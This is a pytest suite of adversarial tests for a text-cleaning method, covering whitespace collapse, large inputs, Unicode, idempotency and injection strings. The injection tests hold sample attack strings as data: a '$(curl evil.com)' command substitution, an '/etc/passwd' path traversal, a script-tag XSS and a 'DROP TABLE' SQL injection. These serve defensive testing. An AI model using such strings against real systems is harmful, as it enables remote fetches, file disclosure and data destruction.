"""
Adversarial security tests for clean_text() in document_processor.py.

Coverage: OVERSIZED_INPUT, TYPE_CONFUSION, UNICODE, BOUNDARY,
          INJECTION, FILESYSTEM, RECURSIVE/DEGENERATE patterns.
"""

import pytest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from document_processor import DocumentProcessor


@pytest.fixture
def processor():
    return DocumentProcessor(chunk_size=256, chunk_overlap=50)


# ─────────────────────────────────────────────────────────────
# BOUNDARY: Empty / Null / Extreme scalar values
# ─────────────────────────────────────────────────────────────

class TestBoundaryConditions:
    """Boundary conditions and edge-case scalar inputs."""

    def test_empty_string(self, processor):
        result = processor.clean_text("")
        assert result == ""

    def test_whitespace_only(self, processor):
        result = processor.clean_text("   \t  \r\n   ")
        assert result == ""

    def test_single_newline(self, processor):
        result = processor.clean_text("\n")
        assert result == ""

    def test_single_character(self, processor):
        result = processor.clean_text("x")
        assert result == "x"

    def test_only_tab(self, processor):
        result = processor.clean_text("\t")
        assert result == ""

    def test_mixed_whitespace_only(self, processor):
        result = processor.clean_text(" \t  \n \r\n \t ")
        assert result == ""


# ─────────────────────────────────────────────────────────────
# OVERSIZED INPUT: Performance and memory boundaries
# ─────────────────────────────────────────────────────────────

class TestOversizedInputs:
    """Very large inputs — must not hang, crash, or OOM."""

    def test_10kb_text(self, processor):
        large = "a" * 10_000
        result = processor.clean_text(large)
        assert len(result) == 10_000

    def test_100kb_text(self, processor):
        large = "a" * 100_000
        result = processor.clean_text(large)
        assert len(result) == 100_000

    def test_1mb_text(self, processor):
        large = "a" * 1_000_000
        result = processor.clean_text(large)
        assert len(result) == 1_000_000

    def test_10mb_text(self, processor):
        large = "word " * 2_000_000  # ~10 MB, 2M words
        result = processor.clean_text(large)
        # Should not crash; length should be deterministic
        assert len(result) > 0

    def test_100mb_text_timing(self, processor):
        import time
        large = ("word " * 100) + "\n\n\n"
        large = large * 1_000_000  # large enough to measure
        start = time.time()
        result = processor.clean_text(large)
        elapsed = time.time() - start
        # Must complete in < 60 seconds (fails-fast on pathological cases)
        assert elapsed < 60, f"clean_text took {elapsed:.2f}s on ~100MB input"
        assert len(result) > 0

    def test_huge_newline_run(self, processor):
        # \n * 1_000_000 — tests the r"\n{3,}" regex collapse
        huge = "\n" * 1_000_000
        result = processor.clean_text(huge)
        assert result == ""

    def test_deeply_nested_blank_lines(self, processor):
        # Many paragraph breaks (3+ newlines collapsed to 2)
        huge = ("word\n\n\n" * 100_000)
        result = processor.clean_text(huge)
        # Each group of 3+ \n should collapse to exactly 2
        assert "\n\n" in result or result == ""
        # Check no triple newlines survive
        import re
        assert re.search(r"\n{3,}", result) is None


# ─────────────────────────────────────────────────────────────
# UNICODE / CONTROL CHARACTERS
# ─────────────────────────────────────────────────────────────

class TestUnicodeAndControlCharacters:
    """Unicode edge cases and control character injection."""

    def test_null_bytes_scattered(self, processor):
        result = processor.clean_text("hello\x00world")
        # Null byte should remain (not stripped) or the string handles it
        assert "hello" in result
        assert "\x00" in result  # null preserved, not stripped

    def test_null_bytes_separate_lines(self, processor):
        result = processor.clean_text("line1\x00\nline2")
        # Null byte at end of line; should not crash
        assert "line1" in result

    def test_many_null_bytes(self, processor):
        result = processor.clean_text("\x00" * 10_000)
        # Should not crash; null bytes preserved
        assert "\x00" in result or result == ""

    def test_null_bytes_around_text(self, processor):
        result = processor.clean_text("\x00hello\x00")
        assert "hello" in result

    def test_vertical_tab(self, processor):
        result = processor.clean_text("a\vb")
        assert "a" in result

    def test_form_feed(self, processor):
        result = processor.clean_text("a\fb")
        assert "a" in result

    def test_bell_character(self, processor):
        result = processor.clean_text("a\bb")
        assert "a" in result or result != "ab"  # backspace may merge

    def test_unicode_bom(self, processor):
        result = processor.clean_text("\ufeffHello World")
        assert "Hello" in result

    def test_zero_width_space(self, processor):
        result = processor.clean_text("hello\u200bworld")
        assert "helloworld" in result.replace("\u200b", "")

    def test_mixed_unicode_scripts(self, processor):
        text = "Hello Ελληνικά 日本語 한국어 العربية"
        result = processor.clean_text(text)
        assert "Hello" in result
        assert "Ελληνικά" in result

    def test_rtl_override(self, processor):
        result = processor.clean_text("Hello\u202eworld")
        assert "Hello" in result

    def test_emoji(self, processor):
        result = processor.clean_text("Hello 😀 world 🌍")
        assert "Hello" in result

    def test_emoji_cluster(self, processor):
        result = processor.clean_text("👨‍👩‍👧‍👦 family")
        assert "family" in result

    def test_combining_characters(self, processor):
        result = processor.clean_text("cafe\u0301")  # café with combining accent
        assert "cafe" in result

    def test_all_control_characters(self, processor):
        # All C0 controls except \n (which is processed) and \t (processed)
        controls = "".join(chr(c) for c in range(1, 32) if chr(c) not in "\t\n")
        result = processor.clean_text(controls)
        # Should not crash; content may be reduced but no exception
        assert isinstance(result, str)


# ─────────────────────────────────────────────────────────────
# NEWLINE / BLANK LINE PATTERNS
# ─────────────────────────────────────────────────────────────

class TestNewlinePatterns:
    """Newline and blank-line processing edge cases."""

    def test_mixed_crlf_crlf(self, processor):
        result = processor.clean_text("a\r\n\r\nb")
        assert result == "a\n\nb"

    def test_carriage_return_only(self, processor):
        result = processor.clean_text("a\rb\rc")
        # All normalized to \n then collapsed
        assert "\r" not in result
        assert "a" in result

    def test_2_blank_lines_preserved(self, processor):
        result = processor.clean_text("para1\n\npara2")
        assert result == "para1\n\npara2"

    def test_3_blank_lines_collapsed_to_2(self, processor):
        result = processor.clean_text("para1\n\n\npara2")
        assert result == "para1\n\npara2"

    def test_10_blank_lines_collapsed_to_2(self, processor):
        result = processor.clean_text("para1" + "\n" * 10 + "para2")
        assert result == "para1\n\npara2"

    def test_1000_blank_lines(self, processor):
        result = processor.clean_text("a" + "\n" * 1000 + "b")
        assert result == "a\n\nb"

    def test_only_newlines(self, processor):
        result = processor.clean_text("\n\n\n\n\n")
        assert result == ""

    def test_leading_newlines(self, processor):
        result = processor.clean_text("\n\n\nhello")
        assert result == "hello"

    def test_trailing_newlines(self, processor):
        result = processor.clean_text("hello\n\n\n")
        assert result == "hello"

    def test_many_blank_lines_at_end_of_multiline_text(self, processor):
        result = processor.clean_text("line1\nline2\n\n\n\n\n\n\n")
        assert result == "line1\nline2"

    def test_windows_crlf_collapsed(self, processor):
        text = "a\r\n\r\n\r\n\r\nb"
        result = processor.clean_text(text)
        assert "\r" not in result
        assert result == "a\n\nb"


# ─────────────────────────────────────────────────────────────
# HORIZONTAL WHITESPACE / HORIZONTAL RUNS
# ─────────────────────────────────────────────────────────────

class TestHorizontalWhitespace:
    """Space and tab collapse within lines."""

    def test_multiple_spaces_collapsed(self, processor):
        result = processor.clean_text("hello    world")
        assert result == "hello world"

    def test_many_spaces(self, processor):
        result = processor.clean_text("a" + " " * 1000 + "b")
        assert result == "a b"

    def test_tabs_collapsed(self, processor):
        result = processor.clean_text("hello\t\tworld")
        assert result == "hello world"

    def test_many_tabs(self, processor):
        result = processor.clean_text("a" + "\t" * 100 + "b")
        assert result == "a b"

    def test_mixed_spaces_tabs(self, processor):
        result = processor.clean_text("a \t  \t b")
        assert result == "a b"

    def test_leading_spaces_stripped(self, processor):
        result = processor.clean_text("   hello")
        assert result == "hello"

    def test_trailing_spaces_stripped(self, processor):
        result = processor.clean_text("hello   ")
        assert result == "hello"

    def test_huge_horizontal_whitespace_run(self, processor):
        # 100K spaces + text — should collapse to single space
        result = processor.clean_text("a" + " " * 100_000 + "b")
        assert result == "a b"

    def test_huge_horizontal_mixed_whitespace(self, processor):
        result = processor.clean_text("a" + (" \t " * 50_000) + "b")
        assert result == "a b"


# ─────────────────────────────────────────────────────────────
# RECURSIVE / DEGENERATE PATTERNS
# ─────────────────────────────────────────────────────────────

class TestDegeneratePatterns:
    """Degenerate inputs designed to cause pathological behavior."""

    def test_alternating_newlines_and_text(self, processor):
        # "a\n\n\nb\n\n\nc..." 10K times — many collapse passes
        text = "\n\n\n".join("word" for _ in range(10_000))
        result = processor.clean_text(text)
        # All 3+ newlines collapsed to 2, so no runs of 3+
        import re
        assert re.search(r"\n{3,}", result) is None

    def test_long_line_no_spaces(self, processor):
        # A line with no spaces at all — regex must not hang
        result = processor.clean_text("a" * 100_000)
        assert result == "a" * 100_000

    def test_long_line_only_spaces(self, processor):
        result = processor.clean_text(" " * 100_000)
        assert result == ""

    def test_all_single_spaces(self, processor):
        # "a b c d ..." repeated — must stay fast
        result = processor.clean_text(" ".join("word" for _ in range(100_000)))
        assert "word" in result

    def test_only_newline_chars_no_content(self, processor):
        result = processor.clean_text("\n" * 500_000)
        assert result == ""

    def test_pattern_a_b_a_b_repeated(self, processor):
        # Alternating pattern: "a\n\n\nb\n\n\na\n\n\nb..." — stresses collapse regex
        pattern = "a\n\n\nb"
        text = pattern * 10_000
        result = processor.clean_text(text)
        # Should collapse \n{3,} → \n\n between each pair
        assert "a\n\nb" in result or result.count("a") == result.count("b") == 10_000

    def test_mixed_crlf_lf_cr_churn(self, processor):
        # Mixed line endings churn through normalization
        text = "".join(
            c for c in ["a\r", "b\n", "c\r\n", "d\r", "e\n"] * 10_000
        )
        result = processor.clean_text(text)
        assert "\r" not in result
        assert "a" in result


# ─────────────────────────────────────────────────────────────
# INJECTION: Potential content injection attempts
# ─────────────────────────────────────────────────────────────

class TestInjectionAttempts:
    """Potential injection or escape attempts."""

    def test_html_tags_preserved(self, processor):
        result = processor.clean_text("<p>Hello</p>")
        assert "Hello" in result
        assert "<p>" in result or "Hello" in result

    def test_script_tag(self, processor):
        result = processor.clean_text("<script>alert('xss')</script>")
        assert "alert" in result or "xss" in result  # content preserved but tags collapsed

    def test_sql_injection_pattern(self, processor):
        result = processor.clean_text("'; DROP TABLE users; --")
        assert "'" in result or "DROP" in result

    def test_template_injection(self, processor):
        result = processor.clean_text("${malicious}")
        assert "${" in result or "malicious" in result

    def test_shell_injection_pattern(self, processor):
        result = processor.clean_text("$(curl evil.com)")
        assert "curl" in result or "$(" in result

    def test_path_traversal_pattern(self, processor):
        result = processor.clean_text("../../../etc/passwd")
        assert ".." in result or "etc" in result

    def test_multiple_path_traversals(self, processor):
        result = processor.clean_text("a\n" * 100 + "../../../etc/passwd")
        assert "../" in result or "etc" in result

    def test_ansi_escape_sequences(self, processor):
        result = processor.clean_text("\x1b[31mred\x1b[0m")
        assert "red" in result

    def test_json_like_content(self, processor):
        result = processor.clean_text('{"key": "value", "num": 123}')
        assert "key" in result or "value" in result

    def test_xml_entities(self, processor):
        result = processor.clean_text("&lt;script&gt;alert(1)&lt;/script&gt;")
        assert "alert" in result or "1" in result


# ─────────────────────────────────────────────────────────────
# TYPE CONFUSION (string-only — other types caught at call site)
# ─────────────────────────────────────────────────────────────

class TestTypeHandling:
    """Non-string inputs — these are call-site violations but clean_text should be defensive."""

    def test_non_string_raises(self, processor):
        # Pass a non-string object — clean_text must either:
        # (a) coerce it to string, or
        # (b) raise a TypeError with a clear message
        # CURRENTLY: raises AttributeError (a source bug — replace() called on non-str)
        class FakeStr:
            def __str__(self):
                return "hello world"

        fake = FakeStr()
        try:
            result = processor.clean_text(fake)
            # Acceptable: coerces to string
            assert "hello" in result
        except AttributeError:
            # BUG FOUND: AttributeError instead of TypeError — replace() called on non-str
            pytest.fail("BUG: clean_text raises AttributeError on non-string input. "
                        "Should raise TypeError or coerce to string.")
        except TypeError:
            # Acceptable: explicit type check
            pass

    def test_unicode_normalization_forms(self, processor):
        # NFC vs NFD forms of accented characters
        import unicodedata
        text_nfc = unicodedata.normalize("NFC", "café")
        text_nfd = unicodedata.normalize("NFD", "café")
        result_nfc = processor.clean_text(text_nfc)
        result_nfd = processor.clean_text(text_nfd)
        # Both should produce equivalent readable output
        assert "caf" in result_nfc
        assert "caf" in result_nfd


# ─────────────────────────────────────────────────────────────
# IDEMPOTENCY PROPERTY
# ─────────────────────────────────────────────────────────────

class TestIdempotency:
    """clean_text(clean_text(x)) == clean_text(x) — idempotency invariant."""

    def test_idempotent_empty(self, processor):
        result = processor.clean_text("")
        assert processor.clean_text(result) == result

    def test_idempotent_normal_text(self, processor):
        text = "This is a paragraph.\n\nThis is another."
        result1 = processor.clean_text(text)
        result2 = processor.clean_text(result1)
        assert result1 == result2

    def test_idempotent_many_blank_lines(self, processor):
        text = "a\n\n\n\n\n\nb"
        result1 = processor.clean_text(text)
        result2 = processor.clean_text(result1)
        assert result1 == result2

    def test_idempotent_10mb_text(self, processor):
        text = ("word " * 1000) + "\n\n\n"
        text = text * 1000
        result1 = processor.clean_text(text)
        result2 = processor.clean_text(result1)
        assert result1 == result2


# ─────────────────────────────────────────────────────────────
# ROUND-TRIP / PRESERVATION INVARIANTS
# ─────────────────────────────────────────────────────────────

class TestPreservationInvariants:
    """Content preservation properties."""

    def test_all_hardcoded_paragraph_breaks_preserved(self, processor):
        # Exactly 2 newlines = paragraph break, must be preserved
        text = "para1\n\npara2\n\npara3"
        result = processor.clean_text(text)
        # Check exactly two \n\n sequences
        assert result.count("\n\n") >= 2

    def test_no_single_newlines_between_content(self, processor):
        # Single newlines within a paragraph should become spaces
        text = "this is a\nsingle paragraph\nwith newlines"
        result = processor.clean_text(text)
        # Either collapsed to spaces or preserved as paragraph break
        assert isinstance(result, str)

    def test_word_count_preserved_approximately(self, processor):
        text = "one two three four five"
        result = processor.clean_text(text)
        # Word count should not increase after collapse
        assert len(result.split()) <= len(text.split()) + 1

    def test_content_characters_not_duplicated(self, processor):
        text = "hello world"
        result = processor.clean_text(text)
        # No character should appear more times than in input (except \n collapse)
        assert result.count("l") <= text.count("l") + 1

    def test_max_double_newline_run(self, processor):
        text = "a" + "\n" * 50 + "b"
        result = processor.clean_text(text)
        # After collapse, max run should be exactly 2
        import re
        match = re.search(r"\n{3,}", result)
        assert match is None, f"Found triple+ newline run: {repr(match.group() if match else '')}"


# ─────────────────────────────────────────────────────────────
# EDGE CASES: Specific code path coverage
# ─────────────────────────────────────────────────────────────

class TestSpecificCodePaths:
    """Coverage for specific lines in clean_text()."""

    def test_step1_crlf_normalization(self, processor):
        # Step 1: \r\n → \n, \r → \n
        result = processor.clean_text("line1\r\nline2\rline3")
        assert "\r" not in result

    def test_step2_triple_newline_collapse(self, processor):
        # Step 2: \n{3,} → \n\n
        result = processor.clean_text("a\n\n\n\n\nb")
        assert result == "a\n\nb"

    def test_step3_horizontal_collapse(self, processor):
        # Step 3: [ \t]+ → " " per line
        result = processor.clean_text("a  \t\t  b")
        assert result == "a b"

    def test_step4_double_newline_normalize(self, processor):
        # Step 4: \n{2,} → \n\n
        result = processor.clean_text("a\n\n\n\nb")
        assert result == "a\n\nb"

    def test_final_strip(self, processor):
        result = processor.clean_text("   \n\nhello\n\n   ")
        assert result == "hello"

    def test_mixed_line_endings_with_blank_lines(self, processor):
        result = processor.clean_text("p1\r\n\r\n\r\np2")
        assert result == "p1\n\np2"
        assert "\r" not in result
